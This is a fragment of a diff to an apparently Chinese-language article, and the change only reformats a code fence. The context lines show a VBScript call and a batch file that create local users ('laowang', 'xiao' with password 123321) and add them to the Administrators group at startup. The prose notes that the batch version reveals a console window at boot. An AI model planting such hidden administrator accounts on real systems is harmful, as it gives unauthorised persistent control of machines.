@@ -106,7 +106,8 @@ b=wshshell.run ("cmd.exe /c net localgroup Administrators laowang /add",0)
  
 　　其实这个用bat文件也可以，但是bat文件在开机的时候会弹一个小黑框，下面是bat文件的代码
 
-```@echo off
+```
+@echo off
 net user xiao 123321 /add
 net localgroup administrators xiao /add
 ```
